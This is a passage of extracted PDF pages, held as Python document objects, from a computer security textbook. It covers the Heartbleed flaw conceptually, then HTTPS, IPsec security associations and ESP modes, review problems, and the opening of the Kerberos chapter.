RESPONSE\\nMESSAGE\\nExtract payload &\\nput it into response\\nmessage\\n(b) How TLS Heartbleed\\nexploit works\\nCLIENT SERVER\\nMalformed heartbeat:\\nsmall payload\\ndisguised as a big\\none\\nThe payload is expected\\nto be big, so the “bucket”\\ngets other data too \\n* TLS private keys\\n• Authentication cookies\\n• Passwords/credentials\\nRECEIVED\\nHEARTBEAT RESPONSE\\nMemory\\ndata\\nExtract payload &\\nput it into response\\nmessage\\nM22_STAL0611_04_GE_C22.indd   696 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 698, 'page_label': '697'}, page_content='22.4 / HTTPS  697\\nthe requestor. Repeated attacks can result in the exposure of significant amounts of \\nmemory on the vulnerable system. Figure 22.7 illustrates the intended behavior and \\nthe actual behavior for the Heartbleed exploit.\\nThis is a spectacular flaw. The untouched memory could contain private keys, \\nuser identification information, authentication data, passwords, or other sensitive \\ndata. The flaw was not discovered for several years. Even though eventually the bug \\nwas fixed in all implementations, large amounts of sensitive data were exposed to the \\nInternet. Thus, we have a long exposure period, an easily implemented attack, and \\nan attack that leaves no trace. Full recovery from this bug could take years. Com -\\npounding the problem is that OpenSSL is the most widely used TLS implementation. \\n Servers using OpenSSL for TLS include finance, stock trading, personal and corpo-\\nrate email, social networks, banking, online shopping, and government agencies. It \\nhas been estimated that over two-thirds of the Internet’s Web servers use OpenSSL, \\ngiving some idea of the scale of the problem [GOOD14].\\n 22.4 HTTPS\\nHTTPS (HTTP over SSL) refers to the combination of HTTP and SSL to imple -\\nment secure communication between a Web browser and a Web server. The HTTPS \\ncapability is built into all modern Web browsers. Its use depends on the Web server \\nsupporting HTTPS communication.\\nThe principal difference seen by a user of a Web browser is that URL (uniform \\nresource locator) addresses begin with https:// rather than http://. A normal HTTP \\nconnection uses port 80. If HTTPS is specified, port 443 is used, which invokes SSL.\\nWhen HTTPS is used, the following elements of the communication are \\nencrypted:\\n• URL of the requested document\\n• Contents of the document\\n• Contents of browser forms (filled in by browser user)\\n• Cookies sent from browser to server and from server to browser\\n• Contents of HTTP header\\nHTTPS is documented in RFC 2818 (HTTP Over TLS, 2000). There is no fun-\\ndamental change in using HTTP over either SSL or TLS, and both implementations \\nare referred to as HTTPS.\\nConnection Initiation\\nFor HTTPS, the agent acting as the HTTP client also acts as the TLS client. The cli-\\nent initiates a connection to the server on the appropriate port then sends the TLS  \\nClientHello to begin the TLS handshake. When the TLS handshake has finished, the cli-\\nent may then initiate the first HTTP request. All HTTP data is to be sent as TLS applica-\\ntion data. Normal HTTP behavior, including retained connections, should be followed.\\nWe need to be clear that there are three levels of awareness of a connection in \\nHTTPS. At the HTTP level, an HTTP client requests a connection to an HTTP server \\nby sending a connection request to the next lowest layer. Typically, the next lowest \\nM22_STAL0611_04_GE_C22.indd   697 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 699, 'page_label': '698'}, page_content='698  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nlayer is TCP , but it also may be TLS/SSL. At the level of TLS, a session is established \\nbetween a TLS client and a TLS server. This session can support one or more con -\\nnections at any time. As we have seen, a TLS request to establish a connection begins \\nwith the establishment of a TCP connection between the TCP entity on the client side \\nand the TCP entity on the server side.\\nConnection Closure\\nAn HTTP client or server can indicate the closing of a connection by including the \\nfollowing line in an HTTP record: Connection: close. This indicates that the con-\\nnection will be closed after this record is delivered.\\nThe closure of an HTTPS connection requires that TLS close the connection \\nwith the peer TLS entity on the remote side, which will involve closing the underlying \\nTCP connection. At the TLS level, the proper way to close a connection is for each \\nside to use the TLS alert protocol to send a close_notify alert. TLS implementa-\\ntions must initiate an exchange of closure alerts before closing a connection. A\\xa0TLS \\nimplementation may, after sending a closure alert, close the connection without wait-\\ning for the peer to send its closure alert, generating an “incomplete close.” Note an \\nimplementation that does this may choose to reuse the session. This should only be \\ndone when the application knows (typically through detecting HTTP message bound-\\naries) that it has received all the message data that it cares about.\\nHTTP clients also must be able to cope with a situation in which the underlying \\nTCP connection is terminated without a prior close_notify alert and without a \\nConnection: close indicator. Such a situation could be due to a programming \\nerror on the server or a communication error that causes the TCP connection to drop. \\nHowever, the unannounced TCP closure could be evidence of some sort of attack. \\nSo the HTTPS client should issue some sort of security warning when this occurs.\\n 22.5 IPv4 AND IPv6 SECURITY\\nIP Security Overview\\nThe Internet community has developed application-specific security mechanisms in a \\nnumber of areas, including electronic mail (S/MIME), client/server (Kerberos), Web \\naccess (SSL), and others. However, users have some security concerns that cut across \\nprotocol layers. For example, an enterprise can run a secure, private TCP/IP network \\nby disallowing links to untrusted sites, encrypting packets that leave the premises, \\nand authenticating packets that enter the premises. By implementing security at the \\nIP level, an organization can ensure secure networking not only for applications that \\nhave security mechanisms but also for the many security-ignorant applications.\\nIn response to these issues, the Internet Architecture Board (IAB) included \\nauthentication and encryption as necessary security features in the next-  generation \\nIP, which has been issued as IPv6. Fortunately, these security capabilities were \\ndesigned to be usable both with the current IPv4 and the future IPv6. This means \\nthat vendors can begin offering these features now, and many vendors do now have \\nsome IPsec capability in their products.\\nIP-level security encompasses three functional areas: authentication, confiden-\\ntiality, and key management. The authentication mechanism assures that a received \\nM22_STAL0611_04_GE_C22.indd   698 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 700, 'page_label': '699'}, page_content='22.5 / IPv4 AND IPv6 SECURITy  699\\npacket was, in fact, transmitted by the party identified as the source in the packet \\nheader. In addition, this mechanism assures that the packet has not been altered in \\ntransit. The confidentiality facility enables communicating nodes to encrypt messages \\nto prevent eavesdropping by third parties. The key management facility is concerned \\nwith the secure exchange of keys. The current version of IPsec, known as IPsecv3, \\nencompasses authentication and confidentiality. Key management is provided by the \\nInternet Key Exchange standard, IKEv2.\\nWe begin this section with an overview of IP security (IPsec) and an intro -\\nduction to the IPsec architecture. We then look at some of the technical details. \\n Appendix\\xa0F reviews Internet protocols.\\nappliCationS of ipSeC IPsec provides the capability to secure communications \\nacross a LAN, across private and public WANs, and across the Internet. Examples of \\nits use include the following:\\n• Secure branch office connectivity o ver the Internet:  A company can build a \\nsecure virtual private network over the Internet or over a public WAN. This \\nenables a business to rely heavily on the Internet and reduce its need for private \\nnetworks, saving costs and network management overhead.\\n• Secure remote access over the Internet: An end user whose system is equipped \\nwith IP security protocols can make a local call to an Internet service provider \\nand gain secure access to a company network. This reduces the cost of toll \\ncharges for traveling employees and telecommuters.\\n• Establishing extranet and intranet connectivity with partners: IPsec can be used \\nto secure communication with other organizations, ensuring authentication and \\nconfidentiality and providing a key exchange mechanism.\\n• Enhancing electronic commerce security:  Even though some Web and elec -\\ntronic commerce applications have built-in security protocols, the use of IPsec \\nenhances that security.\\nThe principal feature of IPsec that enables it to support these varied applica -\\ntions is that it can encrypt and/or authenticate all traffic at the IP level. Thus, all \\ndistributed applications, including remote logon, client/server, e-mail, file transfer, \\nWeb access, and so on, can be secured. Figure 9.3 is a typical scenario of IPsec usage.\\nbenefitS of ipSeC The benefits of IPsec include the following:\\n• When IPsec is implemented in a firewall or router, it provides strong security \\nthat can be applied to all traffic crossing the perimeter. Traffic within a company \\nor workgroup does not incur the overhead of security-related processing.\\n• IPsec in a firewall is resistant to bypass if all traffic from the outside must use IP and \\nthe firewall is the only means of entrance from the Internet into the organization.\\n• IPsec is below the transport layer (TCP , UDP) and so is transparent to applica-\\ntions. There is no need to change software on a user or server system when IPsec \\nis implemented in the firewall or router. Even if IPsec is implemented in end \\nsystems, upper-layer software, including applications, is not affected.\\n• IPsec can be transparent to end users. There is no need to train users on security \\nmechanisms, issue keying material on a per-user basis, or revoke keying material \\nwhen users leave the organization.\\nM22_STAL0611_04_GE_C22.indd   699 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 701, 'page_label': '700'}, page_content='700  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\n• IPsec can provide security for individual users if needed. This is useful for \\n off-site workers and for setting up a secure virtual subnetwork within an orga-\\nnization for sensitive applications.\\nrouting appliCationS In addition to supporting end users and protecting prem-\\nises systems and networks, IPsec can play a vital role in the routing architecture \\nrequired for internetworking. [HUIT98] lists the following examples of the use of \\nIPsec. IPsec can assure that:\\n• A router advertisement (a new router advertises its presence) comes from an \\nauthorized router.\\n• A neighbor advertisement (a router seeks to establish or maintain a neighbor rela-\\ntionship with a router in another routing domain) comes from an authorized router.\\n• A redirect message comes from the router to which the initial packet was sent.\\n• A routing update is not forged.\\nWithout such security measures, an opponent can disrupt communications or \\ndivert some traffic. Routing protocols such as Open Shortest Path First (OSPF) should \\nbe run on top of security associations between routers that are defined by IPsec.\\nThe Scope of IPsec\\nIPsec provides two main functions: a combined authentication/encryption function \\ncalled Encapsulating Security Payload (ESP) and a key exchange function. For virtual \\nprivate networks, both authentication and encryption are generally desired, because \\nit is important both to (1) assure that unauthorized users do not penetrate the vir -\\ntual private network and (2) assure that eavesdroppers on the Internet cannot read \\nmessages sent over the virtual private network. There is also an authentication-only \\nfunction, implemented using an Authentication Header (AH). Because message \\nauthentication is provided by ESP , the use of AH is deprecated. It is included in \\nIPsecv3 for backward compatibility but should not be used in new applications. We \\ndo not discuss AH in this chapter.\\nThe key exchange function allows for manual exchange of keys as well as an \\nautomated scheme.\\nThe IPsec specification is quite complex and covers numerous documents. The \\nmost important of these are:\\n• RFC 2401 (Security Architecture for the Internet Protocol, 1998)\\n• RFC 4302 (IP Authentication Header, 2005) \\n• RFC 4303 (IP Encapsulating Security Payload (ESP), 2005)\\n• RFC 4306 (Internet Key Exchange (IKEv2) Protocol, 2005)\\nIn this section, we provide an overview of some of the most important elements \\nof IPsec.\\nSecurity Associations\\nA key concept that appears in both the authentication and confidentiality mecha -\\nnisms for IP is the security association (SA). An association is a one-way relationship \\nbetween a sender and a receiver that affords security services to the traffic carried \\nM22_STAL0611_04_GE_C22.indd   700 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 702, 'page_label': '701'}, page_content='22.5 / IPv4 AND IPv6 SECURITy  701\\non it. If a peer relationship is needed, for two-way secure exchange, then two security \\nassociations are required. Security services are afforded to an SA for the use of ESP .\\nAn SA is uniquely identified by three parameters:\\n• Security parameter index (SPI):  A bit string assigned to this SA and having \\nlocal significance only. The SPI is carried in an ESP header to enable the receiv-\\ning system to select the SA under which a received packet will be processed.\\n• IP destination address: This is the address of the destination endpoint of the SA, \\nwhich may be an end-user system or a network system such as a firewall or router.\\n• Protocol identifier: This field in the outer IP header indicates whether the asso-\\nciation is an AH or ESP security association.\\nHence, in any IP packet, the security association is uniquely identified by the \\nDestination Address in the IPv4 or IPv6 header and the SPI in the enclosed exten -\\nsion header (AH or ESP).\\nAn IPsec implementation includes a security association database that defines \\nthe parameters associated with each SA. An SA is characterized by the following \\nparameters:\\n• Sequence number counter:  A 32-bit value used to generate the Sequence \\n Number field in AH or ESP headers.\\n• Sequence counter overflow: A flag indicating whether overflow of the sequence \\nnumber counter should generate an auditable event and prevent further trans-\\nmission of packets on this SA.\\n• Antireplay window: Used to determine whether an inbound AH or ESP packet is \\na replay, by defining a sliding window within which the sequence number must fall.\\n• AH information:  Authentication algorithm, keys, key lifetimes, and related \\nparameters being used with AH.\\n• ESP information: Encryption and authentication algorithm, keys, initialization \\nvalues, key lifetimes, and related parameters being used with ESP .\\n• Lifetime of this security association: A time interval or byte count after which \\nan SA must be replaced with a new SA (and new SPI) or terminated, plus an \\nindication of which of these actions should occur.\\n• IPsec protocol mode: Tunnel, transport, or wildcard (required for all implemen-\\ntations). These modes will be discussed later in this section.\\n• Path MTU: Any observed path maximum transmission unit (maximum size of \\na packet that can be transmitted without fragmentation) and aging variables \\n(required for all implementations).\\nThe key management mechanism that is used to distribute keys is coupled to \\nthe authentication and privacy mechanisms only by way of the security parameters \\nindex. Hence, authentication and privacy have been specified independent of any \\nspecific key management mechanism.\\nEncapsulating Security Payload\\nThe Encapsulating Security Payload provides confidentiality services, including confi-\\ndentiality of message contents and limited traffic flow confidentiality. As an optional \\nfeature, ESP can also provide an authentication service.\\nM22_STAL0611_04_GE_C22.indd   701 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 703, 'page_label': '702'}, page_content='702  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nFigure 22.8 shows the format of an ESP packet. It contains the following fields:\\n• Security Parameters Index (32 bits): Identifies a security association.\\n• Sequence Number (32 bits): A monotonically increasing counter value.\\n• Payload Data (variable): This is a transport-level segment (transport mode) or \\nIP packet (tunnel mode) that is protected by encryption.\\n• Padding (0–255 bytes): May be required if the encryption algorithm requires \\nthe plaintext to be a multiple of some number of octets.\\n• Pad Length (8 bits): Indicates the number of pad bytes immediately preceding \\nthis field.\\n• Next Header (8 bits): Identifies the type of data contained in the Payload Data \\nfield by identifying the first header in that payload (e.g., an extension header \\nin IPv6, or an upper-layer protocol such as TCP).\\n• Integrity Check Value (variable): A variable-length field (must be an integral \\nnumber of 32-bit words) that contains the integrity check value computed over \\nthe ESP packet minus the Authentication Data field.\\nTransport and Tunnel Modes\\nESP supports two modes of use: transport and tunnel modes. We begin this section \\nwith a brief overview.\\ntranSport Mode Transport mode provides protection primarily for upper-layer \\nprotocols. That is, transport mode protection extends to the payload of an IP packet. \\nExamples include a TCP or UDP segment, both of which operate directly above IP in \\na host protocol stack. Typically, transport mode is used for end-to-end communication \\nbetween two hosts (e.g., a client and a server, or two workstations). When a host runs \\nFigure 22.8 IPsec ESP Format\\nAuthentication coverage\\nPadding (0–255 bytes)\\nNext headerPad length\\nSequence number\\nSecurity parameters index (SPI)\\nPayload data (variable)\\n0Bit: 16 24 31\\nConﬁdentiality coverage\\nAuthentication data (variable)\\nM22_STAL0611_04_GE_C22.indd   702 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 704, 'page_label': '703'}, page_content='22.6 / KEy TERMS, REVIEW QUESTIoNS, AND PRoBLEMS  703\\nESP over IPv4, the payload is the data that normally follow the IP header. For IPv6, \\nthe payload is the data that normally follow both the IP header and any IPv6 exten-\\nsion headers that are present, with the possible exception of the destination options \\nheader, which may be included in the protection.\\nESP in transport mode encrypts and optionally authenticates the IP payload \\nbut not the IP header.\\ntunnel Mode Tunnel mode provides protection to the entire IP packet. To achieve \\nthis, after the ESP fields are added to the IP packet, the entire packet plus security \\nfields are treated as the payload of new outer IP packet with a new outer IP header. \\nThe entire original, inner, packet travels through a tunnel from one point of an IP \\nnetwork to another; no routers along the way are able to examine the inner IP header. \\nBecause the original packet is encapsulated, the new, larger packet may have totally \\ndifferent source and destination addresses, adding to the security. Tunnel mode is \\nused when one or both ends of a security association are a security gateway, such as \\na firewall or router that implements IPsec. With tunnel mode, a number of hosts on \\nnetworks behind firewalls may engage in secure communications without implement-\\ning IPsec. The unprotected packets generated by such hosts are tunneled through \\nexternal networks by tunnel mode SAs set up by the IPsec software in the firewall \\nor secure router at the boundary of the local network.\\nHere is an example of how tunnel mode IPsec operates. Host A on a network \\ngenerates an IP packet with the destination address of host B on another network, \\nsimilar to that shown in Figure 9.3. This packet is routed from the originating host \\nto a firewall or secure router at the boundary of A’s network. The firewall filters all \\noutgoing packets to determine the need for IPsec processing. If this packet from \\nA to B requires IPsec, the firewall performs IPsec processing and encapsulates the \\npacket with an outer IP header. The source IP address of this outer IP packet is this \\nfirewall, and the destination address may be a firewall that forms the boundary to \\nB’s local network. This packet is now routed to B’s firewall, with intermediate routers \\nexamining only the outer IP header. At B’s firewall, the outer IP header is stripped \\noff, and the inner packet is delivered to B.\\nESP in tunnel mode encrypts and optionally authenticates the entire inner \\nIP\\xa0packet, including the inner IP header.\\n 22.6 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nadministrative management \\ndomain (ADMD)\\nDomain Name System (DNS)\\nDomainKeys Identified Mail \\n(DKIM)\\nEncapsulating Security \\n Payload (ESP)\\nHTTPS (HTTP over SSL)\\nIPsec\\nIPv4\\nIPv6\\nMultipurpose Internet Mail \\nExtension (MIME)\\nradix-64\\nSecure Sockets Layer (SSL)\\nS/MIME\\nTransport Layer Security \\n(TLS)\\nM22_STAL0611_04_GE_C22.indd   703 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 705, 'page_label': '704'}, page_content='704  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nReview Questions\\n 22.1 List the default algorithms used for signing S/MIME messages.\\n 22.2 What is radix-64 conversion?\\n 22.3 Why is radix-64 conversion useful for an e-mail application?\\n 22.4 What is DKIM?\\n 22.5 During an HTTPS connection, which elements of the communication are encrypted?\\n 22.6 What is the difference between an SSL connection and an SSL session?\\n 22.7 List the four categories of SSL/TLS attacks.\\n 22.8 What is the purpose of HTTPS?\\n 22.9 State the three levels of awareness of a connection in HTTPS.\\n 22.10 Explain the transport and tunnel modes of ESP.\\n 22.11 What are the two ways of providing authentication in IPsec?\\nProblems\\n 22.1 In SSL and TL S, why is there a separate Change Cipher Spec Protocol rather than \\nincluding a change_cipher_spec message in the Handshake Protocol?\\n 22.2 Consider the following threats to Web security and describe how each is countered by \\na particular feature of SSL:\\na. Man-in-the-middle attack: An attacker interposes during key exchange, acting as \\nthe client to the server and as the server to the client.\\nb. Password sniffing: Passwords in HTTP or other application traffic are eavesdropped.\\nc. IP spoofing: Uses forged IP addresses to fool a host into accepting bogus data.\\nd. IP hijacking: An active, authenticated connection between two hosts is disrupted \\nand the attacker takes the place of one of the hosts.\\ne. SYN flooding: An attacker sends TCP SYN messages to request a connection but \\ndoes not respond to the final message to establish the connection fully. The attacked \\nTCP module typically leaves the “half-open connection” around for a few minutes. \\nRepeated SYN messages can clog the TCP module.\\n 22.3 Based on what you have learned in this chapter, there are three levels of awareness of \\na connection in HTTPS. What are these three levels of awareness? Explain how a TLS \\nrequest to establish a connection begins.\\n 22.4 A replay attack is one in which an attacker obtains a copy of an authenticated packet \\nand later transmits it to the intended destination. The receipt of duplicate,  authenticated \\nIP packets may disrupt service in some way or may have some other undesired con -\\nsequence. The Sequence Number field in the IPsec authentication header is designed \\nto thwart such attacks. Because IP is a connectionless, unreliable service, the protocol \\ndoes not guarantee that packets will be delivered in order and does not guarantee that \\nall packets will be delivered. Therefore, the IPsec authentication document dictates \\nthat the receiver should implement a window of size W, with a default of W = 64. \\nThe right edge of the window represents the highest sequence number, N, so far \\nreceived for a valid packet. For any packet with a sequence number in the range from \\nN - W + 1 to N that has been correctly received (i.e., properly authenticated), the \\ncorresponding slot in the window is marked (see Figure 22.9). Deduce from the figure \\nhow processing proceeds when a packet is received and explain how this counters the \\nreplay attack.\\n 22.5 IPsec ESP can be used in two differ ent modes of operation. In the first mode, ESP \\nis used to encrypt and optionally authenticate the data carried by IP (e.g., a TCP \\nsegment). For this mode using IPv4, the ESP header is inserted into the IP packet \\nimmediately prior to the transport-layer header (e.g., TCP , UDP , ICMP) and an ESP \\ntrailer (Padding, Pad Length, and Next Header fields) is placed after the IP packet; if \\nM22_STAL0611_04_GE_C22.indd   704 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 706, 'page_label': '705'}, page_content='22.6 / KEy TERMS, REVIEW QUESTIoNS, AND PRoBLEMS  705\\nauthentication is selected, the ESP Authentication Data field is added after the ESP \\ntrailer. The entire transport-level segment plus the ESP trailer are encrypted. Authen-\\ntication covers all of the ciphertext plus the ESP header. In the second mode, ESP \\nis used to encrypt an entire IP packet. For this mode, the ESP header is prefixed to \\nthe packet, and then the packet plus the ESP trailer are encrypted. This method can \\nbe used to counter traffic analysis. Because the IP header contains the destination \\naddress and possibly source routing directives and hop-by-hop option information, it \\nis not possible simply to transmit the encrypted IP packet prefixed by the ESP header. \\nIntermediate routers would be unable to process such a packet. Therefore, it is neces-\\nsary to encapsulate the entire block (ESP header plus ciphertext plus authentication \\ndata, if present) with a new IP header that will contain sufficient information for rout-\\ning. Suggest applications for the two modes.\\n 22.6 There are many different algorithms for signing S/MIME messages but there are a \\nfew algorithms which are otherwise used as default algorithms for achieving this task. \\n Explain the step-by-step procedure of signing the S/MIME messages by using the \\ndefault algorithms that are specified in the text.\\n 22.7 An alternative to the radix-64 conversion in S/MIME is the quoted-printable transfer \\nencoding. The first two encoding rules are as follows:\\n1. General 8-bit representation: This rule is to be used when none of the other rules \\napply. Any character is represented by an equal sign followed by a two-digit hexa-\\ndecimal representation of the octet’s value. For example, the ASCII form feed, \\nwhich has an 8-bit value of decimal 12, is represented by ;=0C<.\\n2. Literal representation: Any character in the range decimal 33 (“!”) through decimal \\n126 (;/uni223C.alt<), except decimal 61 (;=<), is represented as that ASCII character. The \\nremaining rules deal with spaces and line feeds. Explain the differences between \\nthe intended use for the quoted-printable and base 64 encodings.\\nFigure 22.9 Antireplay Mechanism\\nFixed window size W\\nN\\nN + 1N - W\\nMarked if valid\\npacket received\\nUnmarked if valid\\npacket not yet received\\nAdvance window if\\nvalid packet to the\\nright is received\\nM22_STAL0611_04_GE_C22.indd   705 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 707, 'page_label': '706'}, page_content='23.1 Kerberos\\nThe Kerberos Protocol\\nKerberos Realms and Multiple Kerberi\\nVersion 4 and Version 5\\nPerformance Issues\\n23.2 X.509\\n23.3 Public-Key Infrastructure\\nPublic Key Infrastructure X.509 (PKIX)\\n23.4 Key Terms, Review Questions, and Problems\\nInternet Authentication \\nApplications\\nCHAPTER \\n \\n706\\nM23_STAL0611_04_GE_C23.indd   706 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 708, 'page_label': '707'}, page_content='23.1 / KERBEROS  707\\nThis chapter examines some of the authentication functions that have been  developed \\nto support network-based authentication and digital signatures.\\nWe begin by looking at one of the earliest and also one of the most widely \\nused services: Kerberos. Next, we examine the X.509 public-key certificates. Then, \\nwe examine the concept of a public-key infrastructure (PKI).\\n 23.1 KERBEROS\\nThere are a number of approaches that organizations can use to secure networked \\nservers and hosts. Systems that use one-time passwords thwart any attempt to guess \\nor capture a user’s password. These systems require special equipment such as smart \\ncards or synchronized password generators to operate, and have been slow to gain \\nacceptance for general networking use. Another approach is the use of biometric \\nsystems. These are automated methods of verifying or recognizing identity on the \\nbasis of some physiological characteristic, such as a fingerprint or iris pattern, or a \\nbehavioral characteristic, such as handwriting or keystroke patterns. Again, these \\nsystems require specialized equipment.\\nAnother way to tackle the problem is the use of authentication software tied \\nto a secure authentication server. This is the approach taken by Kerberos. Kerberos, \\ninitially developed at MIT, is a software utility available both in the public domain \\nand in commercially supported versions. Kerberos has been issued as an Internet \\nstandard and is the de facto standard for remote authentication, including as part of \\nMicrosoft’s Active Directory service.\\nThe overall scheme of Kerberos is that of a trusted third-party authentication \\nservice. It is trusted in the sense that clients and servers trust Kerberos to mediate \\ntheir mutual authentication. In essence, Kerberos requires that a user prove his or \\nher identity for each service invoked and, optionally, requires servers to prove their \\nidentity to clients.\\nThe Kerberos Protocol\\nKerberos makes use of a protocol that involves clients, application servers, and a \\nKerberos server. That the protocol is complex reflects that fact that there are many \\nways for an opponent to penetrate security. Kerberos is designed to counter a variety \\nof threats to the security of a client/server dialogue.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Summarize the basic operation of Kerberos.\\n ◆ Compare the functionality of Kerberos version 4 and version 5.\\n ◆ Understand the format and function of X.509 certificates.\\n ◆ Explain the public-key infrastructure concept.\\nM23_STAL0611_04_GE_C23.indd   707 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 709, 'page_label': '708'}, page_content='708  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\nThe basic idea is simple. In an unprotected network environment, any client can \\napply to any server for service. The obvious security risk is that of impersonation. \\nAn opponent can pretend to be another client and obtain unauthorized privileges \\non\\xa0server machines. To counter this threat, servers must be able to confirm the identi-\\nties of clients who request service. Each server can be required to undertake this task \\nfor each client/server interaction, but in an open environment, this places a substan-\\ntial burden on each server. An alternative is to use an authentication server (AS) that \\nknows the passwords of all clients and stores these in a centralized database. Then \\nthe user can log onto the AS for identity verification. Once the AS has verified the \\nuser’s identity, it can pass this information on to an application server, which will then \\naccept service requests from the client.\\nThe trick is how to do all this in a secure way. It simply will not do to have \\nthe  client send the user’s password to the AS over the network: An opponent could \\nobserve the password on the network and later reuse it. It also will not do for \\n Kerberos to send a plain message to a server validating a client: An opponent could \\nimpersonate the AS and send a false validation.\\nThe way around this problem is to use encryption and a set of messages that \\naccomplish the task (see Figure 23.1). The original version of Kerberos used the Data \\nEncryption Standard (DES) as it’s encryption algorithm.\\nThe AS shares a unique secret key with each server. These keys have been \\n distributed physically or in some other secure manner. This will enable the AS to send \\nmessages to application servers in a secure fashion. To begin, the user logs on to a \\nworkstation and requests access 